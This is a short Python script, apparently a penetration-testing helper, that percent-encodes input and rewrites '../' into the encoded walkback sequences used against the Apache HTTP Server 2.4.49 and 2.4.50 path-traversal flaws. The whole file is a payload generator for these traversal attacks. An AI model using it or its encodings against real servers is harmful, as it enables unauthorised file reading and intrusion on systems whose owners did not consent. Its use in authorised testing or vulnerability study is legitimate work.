#!/usr/bin/env python3
# Basic Percent Encoder
# For Apache HTTP Server 2.4.49 (.%2e/ walkback)
# For Apache HTTP Server 2.4.50 (.%32%65/ walkback)

print("Select Type:")
print("(1) General")
print("(2) Apache 2.4.49")
print("(3) Apache 2.4.50")
mode = input(" > ")

# General percent encoding
if mode == '1':
    payload = input("Enter Payload: ")
    for i in payload:
        if i == '/':
            print(i,end='')
        else:
            print("%"+hex(ord(i))[2:4],end='')

# Apache 2.4.49 directory traversal
elif mode == '2':
    payload = input("Enter Payload: ").replace("../", ".%2e/")
    print(payload)

# Apache 2.4.50 directory traversal
elif mode == '3':
    payload = input("Enter Payload: ").replace("../", ".%32%65/")
    print(payload)

else:
    print("Invalid Selection")

print()
